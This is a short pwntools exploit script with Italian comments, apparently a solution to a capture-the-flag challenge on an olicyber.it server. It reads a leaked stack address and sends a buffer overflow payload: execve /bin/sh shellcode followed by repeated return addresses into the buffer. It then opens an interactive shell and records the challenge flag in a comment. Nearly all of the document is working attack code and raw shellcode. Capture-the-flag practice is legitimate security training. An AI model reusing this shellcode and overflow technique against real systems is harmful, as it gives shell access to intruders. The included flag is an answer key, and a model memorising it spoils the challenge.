#! /usr/bin/env python3

# WRITEUP
# il programma della challenge genera un buffer di valore causale
# il problema e che mi ritorna l' indirizzo del buffer, che devo quindi eseguire
# in qualche modo 
# allora io mi carico tutto e per tutti gli indirizzi in cui puo saltare gli mando 
# lindirizzo in cui si trova la shell, quindi 125 posizioni possibili tutte  portano alla shell
# sono quasi sicuro che quando salta vada alla shell quindi e fatta


from pwn import *

processo = ELF('./generatore_poco_casuale')
# conn = process(processo.path)
conn = remote('gpc.challs.olicyber.it',10104)

context.terminal = ['terminator', '-e']

# gdb.attach(conn, """
# b *0x00101257
# c
# """)

shell = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"



conn.recvuntil('casuale: ')
stack = int(conn.recvline().strip().decode())
conn.recvline()
print(stack)

local_28 = p64(stack)
exploit = p64(stack + 1)

payload = b's'+ shell+ b'\x00'*4 + exploit *140
# sleep(1)
conn.sendline(payload)
print(payload)
conn.sendline('s') # non so perche devo inviare di nuovo s, ma funziona
conn.interactive()

# flag{pr3nd1_1l_c0ntr0ll0_d4_un_1nd1r1zz0}

# with open('/tmp/prova.txt', 'wb') as f:
#     f.write(payload)


